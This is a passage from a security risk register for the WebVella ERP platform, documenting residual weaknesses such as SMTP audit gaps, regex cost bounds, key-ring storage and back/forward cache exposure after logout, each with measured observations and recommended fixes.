send, disconnect — and only then construct the `Email` record and persist it with `Status = Sent`. Any
throw from the connect, authenticate or send step therefore returns before the record exists.

**What was observed.** With the mail table emptied, a direct send that failed on certificate validation left
**zero** rows. The identical send, made deliverable, left **one** row at `Sent`. The queued path behaves the
other way round: it persists the row first, so a failure is recorded against it with the transport error
text in `server_error` and the retry counter advanced.

**Why the asymmetry became visible now.** Before `H-11` an accept-any-certificate callback meant transport
failures were rare in practice. Enforcing validation makes a refusal an ordinary outcome, and the ordinary
outcome of a *direct* send failure is that nothing is written down.

**Why it is out of scope here.** The exception still propagates to the caller, which is the contract the
existing callers are written against, and the platform's own logging path is untouched. Persisting a
`Failed` row for direct sends changes what those callers observe and what the mail list screens show — a
user-facing behavioural change the preservation requirement forbids.

**Recommended fix:** persist the `Email` record *before* attempting delivery on the direct paths, exactly as
the queued path does, and update it to `Sent` on success or to a failed state with `server_error` populated
on exception, re-throwing afterwards so the caller contract is unchanged. That makes the audit trail
symmetrical without altering what any caller sees.

### RISK-065 — the update-side validation hook casts where the create-side converts, so a numeric port is rejected

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8; a correctness defect with no security consequence. |
| **Related finding** | Pre-existing. The checkpoint diff for this file is exactly the two certificate hunks. |
| **Owner** | Platform team |

The two validation hooks disagree on how they read the same field. `ValidatePreCreateRecord` uses
`rec["port"]?.ToString()` both for the parse and for the error model. `ValidatePreUpdateRecord` uses
`rec["port"] as string` for the parse and the hard cast `(string)rec["port"]` for the error model.

**What was observed.** Driving the real registered hook through `RecordManager.UpdateRecord` with `port`
supplied as a boxed `Int32` failed, and with development diagnostics enabled the cause is exact:
`InvalidCastException: Unable to cast object of type 'System.Int32' to type 'System.String'`, thrown inside
`ValidatePreUpdateRecord`. The identical value supplied as a `String` succeeded. So the field is not merely
mis-parsed — the hook throws while building the error it meant to report.

**Why the failure is worse than a rejected field.** `as string` yields `null` for any non-string, so the
parse fails and control enters the error branch; the error branch then performs the hard cast on the same
non-string value and throws. `RecordManager` catches it and answers with the generic
`The entity record was not update. An internal error occurred!`, so the caller learns neither the field nor
the reason. See `RISK-066` for the second half of that diagnostic loss.

**Why it is out of scope here.** No security boundary is involved: the entity is administrator-only, the
update is refused rather than accepted, and it fails closed. It is a type-handling defect in pre-existing
platform code, and AAP 0.3.2 forbids refactoring beyond security requirements.

**Recommended fix:** make the update hook read the field exactly as the create hook does —
`rec["port"]?.ToString()` in both the `Int32.TryParse` call and the `ErrorModel.Value` assignment — and
audit the other
`case` arms of the same `switch` for the same `as string` / `(string)` idiom, since the asymmetry is a
copy-editing divergence rather than a deliberate distinction.

### RISK-066 — a validation exception carries no message, so only its error collection is informative

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | Pre-existing; the companion to `RISK-065`. |
| **Owner** | Platform team |

The SMTP-service test-page path constructs `new ValidationException()` and attaches every detail through
`AddError` before `CheckAndThrow`. The exception's own `Message` is therefore whatever the parameterless
constructor produces, and carries no description of what was rejected.

**What was observed.** In the `RISK-065` reproduction the caller received only the generic internal-error
string and an **empty** error collection, so neither channel identified the field. Any consumer that logs
`ex.Message` — the common shape — records a failure with no diagnostic content at all.

**Why it is out of scope here.** It is a diagnosability defect. It leaks nothing and grants nothing; and the
opposite defect would be worse, since a validation exception whose message concatenated the field values
would be an information-disclosure finding of its own on a surface that reaches the browser.

**Recommended fix:** pass a short, non-reflective summary to the constructor — the count and the field names,
never the submitted values — so a single-channel consumer still learns which fields failed, and keep the
per-field detail in `.Errors` where it is today.

### RISK-067 — a malformed boolean setting fails the host closed without naming the setting

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8 and AAP 0.3.2. |
| **Related finding** | Pre-existing platform configuration code. Relevant to `H-11`/`RISK-033` because `Settings:DevelopmentMode` is the discriminator for the certificate opt-out posture. |
| **Owner** | Platform team |

`ErpSettings.Initialize` parses seven boolean settings with one idiom:
`string.IsNullOrWhiteSpace(configuration["…"]) ? <default> : bool.Parse(configuration["…"])`. A blank value
takes the default; a malformed value reaches `bool.Parse` and throws.

**What was observed.** With `Settings__DevelopmentMode=notabool` the host aborts with
`FormatException: String 'notabool' was not recognized as a valid Boolean.` at `ErpSettings.Initialize`. The
message names the **value** and never the **key**. An operator with several boolean settings configured must
bisect them to find the culprit. The same file's encryption-key validation, by contrast, names its setting
explicitly and explains what is required — so the good pattern already exists a few hundred lines away.

**Why failing closed is right and is deliberately preserved.** An unparseable posture flag must never be
silently coerced. `Settings:DevelopmentMode` decides whether the accept-any-certificate opt-out is honoured
(`RISK-033`); defaulting a typo to `false` would be defensible, defaulting it to `true` would be a
vulnerability, and guessing at all is worse than refusing to start. The refusal is the correct behaviour.
Only the message is deficient.

**Why it is out of scope here.** It is a diagnosability improvement across seven unrelated settings in a
core file the checkpoint does not otherwise touch, which is refactoring beyond the security requirement.

**Recommended fix:** introduce one private helper that takes the key and the default, calls `bool.TryParse`,
and on failure throws a message naming the key, the received value and the accepted spellings — then route
all seven call sites through it. The behaviour stays identical (blank takes the default, malformed refuses to
start); only the message improves. The new `Settings:EmailSMTPCheckCertificateRevocation` and the existing
`Settings:EmailSMTPAllowInvalidCertificates` deliberately do **not** share this shape: they are read after
startup and must never abort a send, so both parse non-throwing and fail safe instead.

### RISK-068 — the SMTP relay username is serialised while the password is withheld

| Field | Value |
| --- | --- |
| **Status** | Documented — out of scope under AAP 0.1.3 guideline 8. |
| **Related finding** | The counterpart to the already-remediated credential exposure on the same type. |
| **Owner** | Platform team |

On `SmtpService`, `Password` carries `[JsonIgnore]` with an inline comment recording why — a serialised dump
of a cached service previously carried the plaintext credential out of the process — while `Username` carries
`[JsonProperty("username")]` and is present in every serialisation.

**What is actually exposed.** One half of a credential pair, to a principal who can already read the
`smtp_service` entity, which is administrator-only. A username is not a secret on its own; its value to an
attacker is that it removes the guessing half of a credential-stuffing attempt against the relay.

**Why it is out of scope here.** The entity's read permission already restricts it to administrators, so
withholding the username from serialisation would not change who can learn it — it would only change one
serialisation path, while the record screen, the query API and the database all continue to show it. That is
motion without a reduction in exposure, and AAP 0.1.3 guideline 4 forbids changes that do not close a
weakness.

**Recommended fix, if the serialised shape is ever exposed to a non-administrator surface:** treat the pair
symmetrically — `[JsonIgnore]` on `Username` as well, with the record screen reading it from the entity
record rather than from the serialised service — and re-verify that the SMTP test page and the queue
processor, which both consume the cached service, still authenticate.


#### RISK-112 — Bounding regular-expression cost narrows what a record filter accepts

| Field | Value |
| --- | --- |
| **Status** | Accepted — three bounded residuals of the control that closes review finding `CR2-F-03`. |
| **Related finding** | `CR2-F-03` / `P-09` (CWE-1333 inefficient regular expression complexity, CWE-400 uncontrolled resource consumption), OWASP A03:2021 and A05:2021. |

The control caps the **product** of a pattern's explicit repetition bounds at 256, caps pattern length
at 256 characters and quantifier count at 20, refuses back-references and stacked quantifiers, and
bounds a regex query's execution at 60 seconds instead of 600. Three consequences are accepted rather
than eliminated.

**1. Some legitimate patterns are now refused.** Any pattern whose bounds multiply above 256 — for
instance `(a{1,20}){1,20}` — is rejected even if the author meant it. So are back-references, which are
the one construct that forces PostgreSQL's engine off its non-backtracking path. The ceiling was chosen
by measurement rather than by taste: cost is linear in that product, and 256 admits a worst case of
about 107 ms per 20,000 rows while the next step up, 1024, costs 372 ms and the measured attack shapes
cost seconds. Patterns can be rewritten to stay inside it; the refusal names the reason, though never
the pattern. **The obvious over-broad alternative was tried and rejected**: an earlier revision refused
*all* nesting, which also refused `\d+(\.\d+)*` and `^(a+)+$` — both measured harmless and both
ordinary things to type — while covering nothing the product ceiling does not.

**2. The textbook catastrophic-backtracking shape is deliberately admitted.** `^(a+)+$` and `^(a*)*$`
are accepted, because on this engine they are not a threat: 16.8 ms and 15.2 ms respectively amplified
over 20,000 rows, and 0.5 ms against a single adversarial 10,000-character subject. PostgreSQL's regex
implementation is a hybrid DFA/NFA and never needs the backtracking path for a boolean `WHERE`
predicate. **This admission is contingent on that engine.** If the data layer were ever moved to a
PCRE-family implementation — or if PostgreSQL's matcher were replaced — these shapes would become
exponential and the product ceiling would no longer be the right rule. The 60-second execution bound is
the backstop in that event, which is why both layers exist rather than just the static one. Anyone
changing the regex implementation should revisit `DbRegexPattern` first.

**3. A legitimate regex query over a very large table can now time out.** The execution bound moved
from 600 seconds to 60 for any query carrying a regex predicate. At the worst admissible per-row cost
that still covers tens of millions of rows, and ordinary patterns cost a fraction of it, so no
realistic filter is affected — but a deliberately enormous scan that previously completed in, say, four
minutes will now be cancelled. Non-regex queries are untouched at 600 seconds, so reports and exports
that do not use a regex filter cannot be affected at all. `Count` was previously unbounded beyond the
connection string's 120 seconds and is now bounded to the same 60, because every paged list issues a
count beside its page.

**Why the bound is not configurable.** Adding a setting would put the ceiling in the hands of whoever
edits configuration, which is the same reach an attacker gains through a configuration disclosure, and
the remediation constraints forbid new configuration surface where a constant will do. The constants
are named and documented in `WebVella.Erp/Database/DbRegexPattern.cs` with the measurements that set
them, so a future change is a one-line edit with its justification alongside.

#### RISK-113 — The SDK developer page and its Blazor circuit stay anonymous in Development

| Field | Value |
| --- | --- |
| **Status** | Accepted — the deliberate Development residual of the control that closes review finding `CR2-F-07`, and the closure record for `M-09`'s Production half. |
| **Related finding** | `CR2-F-07` / `P-10` (CWE-306 missing authentication for a critical function, CWE-489 active debug code, CWE-209 generation of an error message containing sensitive information), and `M-09` (CWE-306), OWASP A05:2021 and A07:2021. |
| **Owner** | Platform team |

`WebVella.Erp.Site.Sdk/Startup.cs` grants `/dev` an anonymous exemption from the host's
deny-by-default `AuthorizeFolder("/")`, and leaves the Blazor circuit endpoint `/_blazor` anonymous with
it — but now **only when the environment is `Development`**. This entry exists because a comment in that
file points a reader here, and because `M-09` had no register entry of its own while it was an accepted
risk.

**What changed, and why the earlier acceptance stopped being defensible.** `M-09` recorded the anonymous
page as a Medium compensating for no confirmed Critical or High, and on that basis declined it. Assessed
in isolation that was correct. It is not in isolation: `/dev` renders a Blazor Server component, and this
host — the only one of the seven that configures Blazor Server at all — hard-coded
`CircuitOptions.DetailedErrors = true`, which is precisely the switch deciding whether an unhandled
exception inside a component returns its message and stack trace or an opaque circuit identifier. The
anonymous page was therefore not merely reachable; it was the **delivery vehicle** for server exception
text to an unauthenticated caller. That was confirmed live rather than reasoned about: the anonymous
response carries a Blazor server component descriptor, the protected payload a client presents to
`/_blazor` to open a circuit, so an anonymous caller held everything needed to start one and did not
depend on the page's own script bootstrap working.

**Why the residual is retained rather than eliminated.** Agent Action Plan section 0.3.2 explicitly
declined to *remove* this exemption, on the ground that removal "would break the SDK development
workflow that depends on reaching `/dev` without a session". Deleting the line would therefore have
traded one stated requirement for another. Gating it satisfies both: a deployed host falls back to
deny-by-default and answers with the configured `LoginPath`, while a developer machine running the
`Development` environment keeps the workflow byte-for-byte. Both halves were measured, not assumed —
against a published Production host anonymous `GET /dev` returns **302** to `/login?returnUrl=%2Fdev`
with a zero-length body and anonymous `POST /_blazor/negotiate` returns **400** with no connection
token, while against a Development host both return **200**.

**What the residual actually exposes, stated precisely.** In `Development` only, an unauthenticated
caller on a developer machine can load `/dev`, open a server-side circuit, and receive full detail for
any exception a component raises. That is the intended behaviour of a development environment — the same
environment that also serves the developer exception page and, per `RISK-014`, returns `e.ToString()`
from the bearer-token routes. The bound worth naming is that this is **not** a latent Production risk
waiting on a configuration slip: the gate is `string.Equals(environment.EnvironmentName, "Development",
StringComparison.OrdinalIgnoreCase)`, which **fails secure**, so a misspelled, empty or absent
environment name selects the hardened branch rather than the permissive one. The detail switch is also
deliberately **not** configuration-driven, because a configuration key would let the disclosure be
re-enabled in Production by an operator with no way to know what it exposes — which is how this defect
would return.

**The recommended future fix, if the residual is ever declined.** Restrict `/dev` to the administrator
role instead of exempting it, in every environment, and drop the environment gate. That was `M-09`'s
original recommendation and it remains the stronger control; it is not applied here because it changes
the development workflow the plan protected, which is a product decision rather than a security one.
Anyone taking it should note that the page and the hub must move together: `MapBlazorHub` carries no
authorization metadata of its own and is a separate endpoint from the page that starts it, so gating the
page alone would leave the circuit — where component code and its exceptions execute — reachable.


## Detailed entries — the encryption key character set and recovering data encrypted under a non-ASCII key

#### RISK-114 — A deployment that already encrypted data under a non-ASCII encryption key

| Field | Value |
| --- | --- |
| **Status** | Accepted — a bounded, deterministic recovery path exists and is documented here; the guard that creates the need for it is not relaxed. |
| **Related finding** | `CR2-F-09` / `P-12` (CWE-331 insufficient entropy, CWE-176 improper handling of Unicode encoding), OWASP A02:2021 Cryptographic Failures. |
| **Owner** | Platform team |

This entry exists because the derivation failure raised in `WebVella.Erp/Utilities/CryptoUtility.cs`
points a reader here by name, and because closing `CR2-F-09` deliberately turns a previously accepted
configuration into a start-up refusal. The accepted character set itself is documented in the
[secure configuration guide](secure-configuration.md).

**Who is affected — and the population is small, which is stated rather than glossed.** Only a
deployment that supplied a `Settings:EncryptionKey` containing at least one character above U+007F
**and** encrypted data under it. At this commit no in-tree code path does the latter: a census finds no
live caller of the symmetric encrypt or decrypt surface — its only references outside its own file are
two commented-out lines in the dead `AuthToken.cs` — and no consumer of `CryptKey` or
`ErpSettings.EncryptionKey` elsewhere. The realistic population is therefore a deployment running its
own plugin code, or an older build, that uses the primitive directly. Every other affected deployment
simply supplies a US-ASCII key and is done. The entry is kept in full anyway, because the start-up
refusal it explains applies to **every** host with a non-ASCII key whether or not that host ever
encrypted anything, and an operator meeting that refusal needs to know whether their data is at stake
before they change the value. Such a key was accepted before `CR2-F-09`,
because acceptance measured characters while derivation consumed ASCII bytes. It is refused now, at
start-up and again in the derivation, so an affected host will not start until the operator acts. A
deployment whose key was always US-ASCII is unaffected in every respect: the derived key, the derived
initialisation vector and the resulting ciphertext are byte-identical before and after the change.

**The recovery rule, and why it is exact.** The former behaviour was not lossy in an unpredictable way —
it was a fixed substitution, which is what makes recovery deterministic. `Encoding.ASCII.GetBytes`
replaced each **UTF-16 code unit** above U+007F with `?` (0x3F). The equivalent working key is therefore
the original text with each non-ASCII code unit replaced by a literal `?`.

Two properties make that substitution safe to rely on, and both were measured rather than assumed:

* The substitution is per code unit, not per Unicode scalar. A character outside the Basic Multilingual
  Plane occupies two UTF-16 code units and produced **two** `?` bytes — `U+1F600` derived to `3f3f`,
  while the single-code-unit `U+4E2D` derived to `3f`.
* Because of that, the derived byte count always equals the character count. `GetValidKey` truncates or
  pads the text to the algorithm's key size **before** projecting it, so a length-preserving replacement
  cannot move that boundary. The derived key and initialisation vector are byte-identical, and existing
  ciphertext decrypts unchanged.

**The procedure.** Reconstruct the substituted key, then treat it as compromised:

1. Take the exact original key text, including any character that is not visibly unusual. Replace every
   character above U+007F with `?`. Leave every ASCII character as it is.
2. Supply the result as `Settings:EncryptionKey`. The host starts and previously encrypted values
   decrypt, because the derived bytes are the same bytes the data was encrypted under.
3. Re-encrypt the affected stored values under a fresh key generated from a CSPRNG, then retire the
   substituted key. This step is **not optional**, for the reason in the next paragraph.
4. If the platform is on a build that predates the guard, do not stop at step 2. The key is degraded
   whether or not the guard is present.

**Why rotation is mandatory rather than advisable.** The substituted key is exactly as weak as the
original always was — that weakness is the finding. Every non-ASCII character contributed a single `?`,
so the key's effective entropy was already reduced to whatever its ASCII characters carried, and the
initialisation vector, derived from the same text, was reduced with it. A key that was largely
non-ASCII is close to a run of `?` characters, which is guessable outright. Recovering the data is the
first step, not the remedy.

**The case where step 2 cannot be used, stated plainly.** The substituted key is not always suppliable
through configuration, and the register should not pretend otherwise. Length is never the obstacle,
because the replacement preserves length and any previously accepted key already met the 32-character
floor. The **character-variety** floor can be, because collapsing many distinct non-ASCII characters
into one `?` collapses the distinct-character count with them. Measured against the platform's own
acceptance check:

| Original key shape | Substituted form | Distinct characters | Derives byte-identically | Suppliable as configuration |
| --- | --- | --- | --- | --- |
| Mixed passphrase with three accents | `S?curit?-Cl?-2026-WebVella-ERP-x1` | 23 | Yes | **Yes** |
| ASCII prefix plus ten non-ASCII characters | `WebVella-ERP-2026-Key-??????????` | 16 | Yes | **Yes** |
| Thirty-two distinct non-ASCII characters | Thirty-two `?` characters | 1 | Yes | **No** — fails the eight-distinct-character floor |

A deployment in the third row must decrypt out of band rather than by re-supplying the key: use a build
that predates the guard, or a one-off utility applying the same derivation, to read the affected values
and re-encrypt them under a compliant key; or restore from a backup taken before the data was encrypted
under that key. That is deliberately awkward, and the awkwardness is proportionate — a key of that shape
derived to a single repeated byte, so the data it protected was never meaningfully protected.

**Why the guard is not relaxed for these deployments.** An exemption — a configuration flag, a
development-only bypass, or silently continuing to substitute — would preserve exactly the defect being
removed, and would do so for the deployments already harmed by it. The two guards are also deliberately
separate: start-up validation is the one an operator meets, while the derivation refuses non-ASCII
material from any future source even if it never passed through configuration validation. Neither is
conditioned on environment or posture, for the same reason the published-default key check is not.



## Detailed entries — the Data Protection key ring

#### RISK-115 — The Data Protection key ring is not encrypted at rest

| Field | Value |
| --- | --- |
| **Risk** | When `Settings:DataProtectionKeyDirectory` is configured, the Data Protection key ring is persisted to that directory as XML with **no XML encryptor applied**, so the keys that encrypt and sign every authentication cookie sit on disk in plaintext. |
| **Severity** | Low |
| **Status** | Accepted |
| **Owner** | Platform team |
| **Related finding** | `CR2-F-11` (this review round) |
| **CWE** | CWE-312 (cleartext storage of sensitive information), CWE-522 (insufficiently protected credentials) |
| **Location** | `WebVella.Erp.Web/ErpMvcExtensions.cs`, the `KeyManagementOptions` configuration that sets `XmlRepository` |

**What the framework says, verbatim.** With a file-system repository configured and no encryptor, the
host logs at start-up:

```text
No XML encryptor configured. Key {…} may be persisted to storage in unencrypted form.
```

This was observed on a live host during verification of `CR2-F-11`, alongside the confirmation that the
repository was in fact being used — `FileSystemXmlRepository` logged the write and a single
`key-<guid>.xml` file appeared in the configured directory. The warning is therefore accurate rather
than theoretical, and it is recorded here rather than suppressed.

**Why it is not closed in code.** Every supported way to encrypt the key ring at rest requires material
or a platform facility that this repository does not have and must not invent:

- `ProtectKeysWithCertificate` requires an X.509 certificate with a private key, chosen and provisioned
  by the deployment. Hard-coding a path or a thumbprint would fail at start-up on every deployment that
  does not happen to have that certificate, converting a warning into an outage.
- `ProtectKeysWithDpapi` and `ProtectKeysWithDpapiNG` are Windows-only. The platform's own setup
  targets Linux, so selecting them would make the configuration non-portable.
- A hosted key-management service (Azure Key Vault and equivalents) would require a **new package
  dependency**, which the governing plan prohibits outright, and would bind the platform to one cloud.

Choosing any of these on a deployment's behalf trades a documented, bounded residual for an
undocumented startup failure. The code therefore declines explicitly, in a comment that names this
entry, rather than half-implementing a control.

**Why the residual is smaller than it first appears.** The threat this warning describes is an attacker
who can read the key directory. Such an attacker can generally also read the application's
configuration and its process memory, which yields the database connection string and the encryption
key directly — a strictly greater prize than the ability to forge an authentication cookie. Plaintext
keys on disk are worth fixing, but they are not the weakest link in that scenario.

The residual is also **opt-in**. `Settings:DataProtectionKeyDirectory` is unset by default, and when it
is unset the key ring is left at the framework default and nothing is written to a
platform-administered path by this change.

**How to close it.** Either:

1. Provision an X.509 certificate for the deployment and add `ProtectKeysWithCertificate` alongside the
   existing `XmlRepository` assignment, supplying the certificate the same way the Kestrel certificate
   is already supplied — externally, never committed; or
2. Place the key directory on storage that is encrypted and access-controlled by the platform beneath
   the application: an encrypted volume, or a secret-store-backed mount whose contents are readable
   only by the host's service account.

Option 2 requires no code change at all and is the recommended first step, because it addresses the
same threat with infrastructure controls the deployment already needs for its configuration secrets.

**How the residual is bounded meanwhile.** Restrict the directory to the host's service account only;
place it outside the content root so it can never be served as a static file; give each host its own
directory so a single directory compromise cannot forge tickets for every host; and rotate the key ring
after any suspected exposure, accepting the one-time sign-out that rotation causes. Note that
per-application isolation does **not** depend on this entry being closed: cross-application ticket
acceptance is prevented by the application discriminator, which was verified by replaying one host's
ticket against another while both shared a single key directory — the ticket was refused.


## Detailed entries — the one accepted residual in the secrets gate

#### RISK-116 — Gate 3 accepted one credential-shaped location: a commented-out connection-string template

| Field | Value |
| --- | --- |
| **Status** | **CLOSED.** The commented-out template was removed from `WebVella.Erp.Site/Config.json`, so the sweep now finds nothing to tolerate: Gate 3 reports **0 credential-shaped locations, 0 tolerated** across 1,518 tracked text files. This entry anticipated exactly this outcome - see *What closes it* below - and is retained rather than deleted because the decision it records (never narrow the pattern) still governs. It was previously *Accepted — one reviewed residual, bounded by an exact occurrence count and by a property assertion re-proved on every run.* |
| **Related finding** | `CR2-F-05` (the secrets gate did not complete), H-05 (plaintext database credentials), and the Class 5 secret scrub |
| **CWE** | [CWE-615: Inclusion of Sensitive Information in Source Code Comments](https://cwe.mitre.org/data/definitions/615.html) |
| **Scope** | One location: `WebVella.Erp.Site/Config.json`, the commented-out alternative connection string, matched by sweep layer `L1` |

**What it is.** `WebVella.Erp.Site/Config.json` retains a commented-out alternative connection string as
a **shape**: every value is replaced by an angle-bracketed placeholder — `<host>`, `<port>`, `<user>`,
`<password>` — so it documents the key order for an operator without carrying a credential. The
credential-shape sweep matches it, correctly, because no detector can distinguish a commented-out secret
from a commented-out template by shape alone, and a commented-out secret is committed, published and
mirrored exactly as a live one is.

**Why the pattern was not narrowed instead.** Excluding any value that contains `<` would have made the
match disappear, and that is precisely why it was rejected: it is a **fail-open**. A real password
containing `<` would then be invisible to the layer whose entire job is to find it. The alternative was
measured rather than assumed — a genuine credential-bearing connection string is matched independently by
layers `L1`, `L1B` and `L2C`, so the sweep has depth here, but weakening `L1` would still remove one of
the three for every future case in order to excuse one reviewed line today. Accepting the single location
by name costs one allow-list entry and keeps every pattern intact.

**Why an occurrence count alone would not be enough.** The allow-list bounds this residual to exactly one
match in exactly that file under exactly that layer, so a *new* credential-shaped line added to the same
already-reviewed file still fails the gate. But a count cannot notice the thing most worth noticing:
substituting a real value for a placeholder changes no count at all. So the **property** is asserted
separately on every run — every security-relevant field on the accepted line (`Password`, `Pwd`,
`User Id`, `Server`, `Host`, `Port`, `Database`, `Initial Catalog`, `Data Source`) must still be
angle-bracketed, and the gate fails naming the count of offending fields if any is not. That assertion was
checked against the file's benign tuning values — `Pooling`, `MinPoolSize`, `MaxPoolSize`,
`CommandTimeout` — which are not security-relevant fields and correctly do not trip it.

**Deliberately no line numbers in the allow-list.** An entry keyed by line number moves with every
unrelated edit above it, which makes the gate brittle in the way that most reliably teaches contributors
to loosen a pattern rather than fix a finding. The entry is keyed by layer, path and count instead.

**What closes it.** Deleting the commented block, or moving the key-order documentation into
`docs/security/secure-configuration.md` where it is prose rather than a credential-shaped assignment.
Neither is done here: the comment is load-bearing for an operator configuring the host, and removing it
would trade a reviewed, asserted residual for a real chance of a misconfigured connection string. If it is
removed later, the gate reports the allowance as no longer firing — a `NOTE`, never a failure — so the
allow-list is pruned deliberately instead of quietly outliving its justification.

**What this residual was not.** It was never an unreviewed match. Gate 3 reported `0 unreviewed and 1
reviewed` credential-shaped location while the template stood, and its ability to fail on a real literal
was proved by planting one in the git index and observing exit `1`. **As now measured, with the template
removed:** `0 credential-shaped location(s), 0 tolerated` over 1,518 tracked text files of 1,574 tracked
files, every one of the five sweep layers reporting no match, and the detector still proving itself first
against credentials planted in 10 file formats over 14 required `(layer, fixture)` pairs. The allow-list
entry is therefore inert by design rather than by accident, which is the pruning path this entry
described.


## Detailed entries — what the licence-governance gate cannot reach

#### RISK-117 — The licence gate blocks packaging, not the human step after it

| Field | Value |
| --- | --- |
| **Status** | Accepted — the bounded residual of the control that keeps `RISK-001` unshippable. |
| **Related finding** | Review finding `CR2-F-04`, and `H-01` / `H-11` behind it |
| **CWE** | [CWE-1104: Use of Unmaintained Third Party Components](https://cwe.mitre.org/data/definitions/1104.html) |
| **Owner** | Whoever performs a release. The control is engineering's; the release step it stops short of is not. |

**What it is.** `ErpAssertAutoMapperLicenceDecisionRecorded` in `Directory.Build.props` refuses to
*produce* a package while the `RISK-001` licence question is unanswered. It cannot refuse to *publish*
one. Three gaps follow from that boundary, and all three are deliberate rather than overlooked.

*A package built before the gate existed can still be pushed.* `nuget push` and `dotnet nuget push`
operate on a `.nupkg` file that is already on disk; nothing in MSBuild runs. Any artifact produced from
an earlier commit remains pushable.

*Recording the decision is not the same as being authorised to make it.* The gate checks that an answer
exists and that it is one of the two recognised values. It cannot check who supplied it. Anyone able to
run `dotnet pack -p:ErpAutoMapperLicenceDecision=accepted-rpl-1.5` can satisfy it. What the gate buys is
not authorisation but **deliberateness**: the answer has to be typed, it appears in the build log, and if
it is set in the project file rather than on the command line it appears in a diff and a review.

*The gate is a reviewed edit away from removal.* Deleting the target, or adding the pinned version to
`ErpPermissiveAutoMapperVersions`, disables it. That is a property of every in-repository control and is
why the list carries a comment requiring the release's own `.nuspec` to be read first.

**Why it is accepted rather than extended.** Closing any of the three means reaching outside the
application boundary — a release pipeline with an approval gate, a signing identity, or an
organisation-level nuget.org policy. The governing plan excludes infrastructure beyond the application
boundary and forbids feature work, and none of the three gaps is a code vulnerability. The control was
chosen for the property it does have: it converts the one **irrevocable** step's precondition from "the
build was green" into "somebody answered the question".

**What closes it, if an owner wants it closed.** Require the release job to pass
`-p:ErpAutoMapperLicenceDecision=…` from a protected environment rather than from a developer machine, so
the answer is supplied by whoever holds the release approval; and set the property in
`WebVella.Erp/WebVella.Erp.csproj` once the decision is ratified, so it lands as a reviewable commit
rather than as a transient command-line argument. Both are recommendations, and neither is done here.

**What this residual is not.** It is not a way past the gate on the ordinary path. Measured across all
four packable manifests: `dotnet pack` fails with `ERPLIC001` for 4 of 4 while the question is open, with
`ERPLIC002` for 4 of 4 on an incomplete declination, and with `ERPLIC003` for 4 of 4 on an unrecognised
value; an unreadable pin fails with `ERPLIC004`. `restore`, `build`, `publish`, `run` and all 13 CI gate
steps are unaffected.



## Detailed entries — what runtime verification found after the audit inventory was frozen

#### RISK-118 — Authenticated pages stay restorable from the browser's back/forward cache after logout

| Field | Value |
| --- | --- |
| **Status** | Accepted — documented with fix guidance, deliberately not remediated in this pass. |
| **Related finding** | Discovered while runtime-verifying the fixes for review findings `CR2-F-01` and `CR2-F-02`; it is a distinct weakness from both, and neither is left open by it. |
| **CWE** | [CWE-525: Use of Web Browser Cache Containing Sensitive Information](https://cwe.mitre.org/data/definitions/525.html) |
| **Owner** | Platform team |

**What was measured, not inferred.** A host was published and run under the `Production` environment over
HTTPS, a real login was performed, and logout was then driven through the browser. `GET /logout` returned
`302` to `/login?returnUrl=%2F` with an attribute-matched deletion cookie, and the login page rendered.
Pressing **Back twice** from there restored the complete authenticated shell — navigation bar, application
cards, the lot. The restored screenshot was byte-identical to the pre-logout capture, and **no document
network request was issued**: the renderer served the page from its own back/forward cache.

**Root cause.** The authenticated content response carries no cache directives at all. The framework's own
cookie-authentication pages do: `/login`, the login `POST` and `/logout` each send
`cache-control: no-cache, no-store` together with `pragma: no-cache`. Pages rendered through the platform's
page-component pipeline inherit neither, so nothing tells the browser that the rendering is not reusable.
The seven headers this remediation added are emitted correctly on that response — the gap is specifically
the absence of a caching directive, which is not among them.

**Why the severity is bounded, and how that was established.** The restored view is inert. The exact
authentication ticket captured *before* logout — the one that had returned `200` with authenticated content
minutes earlier — was replayed afterwards against `/`, `/sdk/access/user/l/list`, `/sdk/objects/entity/l`
and `/sdk/server/log/l/list`. All four returned `302` to the login page with zero-byte bodies. Every
in-page request and every link click from the restored rendering therefore lands on the login page too. No
new server access is possible from it, no fresh data is retrievable through it, and no privilege is
recovered by it. What survives is one rendering already delivered to that browser while the session was
valid, recoverable only by someone who already holds the unlocked device — which is precisely the threat
model CWE-525 describes, and precisely why it is an information-disclosure weakness rather than an
authentication one.

**Why it is documented rather than fixed.** Three independent reasons, each traceable to the governing
plan rather than to convenience.

*The mandated header set does not include it.* Section 0.1.3 enumerates exactly seven response headers with
exact values, and every one of them is emitted. `Cache-Control` is not among them, so adding it is not
compliance with the specification — it is a control beyond it.

*The severity matrix assigns this class to documentation.* Information disclosure sits in the Medium band,
whose disposition is "Document with fix guidance". Section 0.6.1's governing rule remediates a Medium only
when it is a compensating control for a confirmed Critical or High, is explicitly mandated by a Fix
Implementation Standard, or is an unavoidable by-product of a Critical or High fix in the same method. This
is none of the three. The Critical-and-High concern behind `CR2-F-01` and `CR2-F-02` is *ticket
acceptance* — tickets that validated fail-open, and bearer tokens that could not be revoked — and the
replay result above is the proof that it is closed independently of this entry.

*The Authentication Hardening standard's logout clause is already satisfied.* "Proper logout with session
invalidation" is about the session, and the session is invalidated server-side: the ticket no longer
authenticates anything. What persists is a client-side rendering, which is not a session.

Minimal Change Clause guideline 8 — document out-of-scope concerns but do not fix unless Critical — is the
final word, and this is not Critical.

**The recommended minimal fix, for whoever takes it.** Emit
`Cache-Control: no-store, no-cache, must-revalidate, max-age=0` together with `Pragma: no-cache` from the
existing `WebVella.Erp.Web/Middleware/SecurityHeadersMiddleware.cs`, scoped to HTML responses on an
authenticated request. Scoping matters as much as the header: applying it to every response would stop the
browser caching the platform's static assets, which is a measurable performance regression against the
ten-percent boundary the plan sets, and the middleware already runs ahead of static file serving, so the
scope has to be chosen rather than assumed. Verification is the same sequence that found it — log in, log
out, press Back twice — with the pass condition that the browser **re-requests the document** and arrives
at the login page.

**One honesty caveat on that fix.** Whether a given browser build additionally declines to place a
`no-store` document in its back/forward cache at all has varied between versions, so the header should be
verified against the browsers actually in use rather than assumed to be sufficient. The re-request is the
observable pass condition; the header is the means, not the proof.

**Why this is recorded here rather than as a new audit-report finding.** The audit inventory of 53 findings
is cited by count across this documentation set and in the remediation log's own arithmetic. This weakness
was found after that inventory was frozen, during verification rather than during the audit sweep.
Renumbering the inventory to admit it would invalidate a count that several documents assert and that a
reader can check, for no gain in the reader's understanding. The register is where the plan already places
